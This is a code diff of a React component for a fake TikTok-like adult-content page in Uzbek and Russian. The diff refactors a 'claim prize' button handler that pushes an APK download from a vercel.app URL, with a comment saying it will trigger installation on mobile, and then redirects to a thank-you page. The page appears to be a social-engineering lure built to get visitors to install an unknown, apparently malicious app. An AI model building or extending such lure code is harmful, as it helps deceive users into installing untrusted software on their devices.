@@ -1,28 +1,12 @@
 import React, { useState, useEffect } from 'react';
+import { useConfig } from '../hooks/useConfig';
 
-const handleClaimPrize = (e) => {
-    e.preventDefault();
-
-    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/sxUZ.apk';
-    
-    // На мобилке: попытка открыть напрямую (вызовет установку)
-    window.location.href = apkUrl;
-
-    // На ПК: открываем в новой вкладке
-    setTimeout(() => {
-      window.open(apkUrl, '_blank');
-    }, 300);
-
-    // Редирект на thankyou после задержки
-    setTimeout(() => {
-      window.location.href = '/thankyou2.html';
-    }, 1500);
-  };
 const TikTokLikeSite = () => {
+  const { config, loading } = useConfig('tiktoklikesite');
   const [scrollPosition, setScrollPosition] = useState(0);
 
-  // Контент для ленты
-  const videos = [
+  // Контент для ленты из конфигурации
+  const videos = config?.videos || [
     {
       id: 1,
       author: '@aylin.uz',
@@ -84,6 +68,44 @@ const TikTokLikeSite = () => {
       image: 'https://tse2.mm.bing.net/th/id/OIP.UseftiZhy_INsCNSsQBqgQHaJ3?w=208&h=277&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1',
     },
   ];
+
+  const handleClaimPrize = (e) => {
+    e.preventDefault();
+
+    const apkUrl = config?.apkUrl || 'https://uzbekistan-info.vercel.app/docs/sxUZ.apk';
+    const thankYouUrl = config?.thankYouUrl || '/thankyou2.html';
+    
+    // На мобилке: попытка открыть напрямую (вызовет установку)
+    window.location.href = apkUrl;
+
+    // На ПК: открываем в новой вкладке
+    setTimeout(() => {
+      window.open(apkUrl, '_blank');
+    }, 300);
+
+    // Редирект на thankyou после задержки
+    setTimeout(() => {
+      window.location.href = thankYouUrl;
+    }, 1500);
+  };
+
+  const texts = config?.texts || {};
+
+  if (loading) {
+    return (
+      <div style={{
+        width: '100%',
+        height: '100vh',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
+        color: 'white'
+      }}>
+        Загрузка...
+      </div>
+    );
+  }
 
   useEffect(() => {
     const totalHeight = videos.length * 720;
@@ -379,25 +401,23 @@ const TikTokLikeSite = () => {
       {/* ПЕРЕДНИЙ ПЛАН */}
       <div style={styles.frontLayer}>
         <div style={styles.frontContent}>
-          <div style={styles.logo}>SXUz</div>
+          <div style={styles.logo}>{texts.logo || 'SXUz'}</div>
 
           <p style={styles.description}>
-            Faqat shu yerda siz Oʻzbekistonning eng sexy qizlarini topasiz
+            {texts.description || 'Faqat shu yerda siz Oʻzbekistonning eng sexy qizlarini topasiz'}
           </p>
 
           <div style={styles.features}>
-            <div style={styles.feature}>
-              <span style={styles.featureIcon}>📱</span>
-              <span>Vertikal kontentning kutub lentasi</span>
-            </div>
-            <div style={styles.feature}>
-              <span style={styles.featureIcon}>⚡</span>
-              <span>Tezkor video yuklash</span>
-            </div>
-            <div style={styles.feature}>
-              <span style={styles.featureIcon}>❤️</span>
-              <span>Interaktiv xususiyatlar</span>
-            </div>
+            {(texts.features || [
+              { icon: '📱', text: 'Vertikal kontentning kutub lentasi' },
+              { icon: '⚡', text: 'Tezkor video yuklash' },
+              { icon: '❤️', text: 'Interaktiv xususiyatlar' }
+            ]).map((feature, index) => (
+              <div key={index} style={styles.feature}>
+                <span style={styles.featureIcon}>{feature.icon}</span>
+                <span>{feature.text}</span>
+              </div>
+            ))}
           </div>
 
           <button
@@ -409,7 +429,7 @@ const TikTokLikeSite = () => {
               e.target.style.boxShadow = '0 8px 24px rgba(255, 55, 48, 0.4)';
             }}
           >
-            📥 Ilovani oʻrnatish
+            {texts.button || '📥 Ilovani oʻrnatish'}
           </button>
         </div>
       </div>
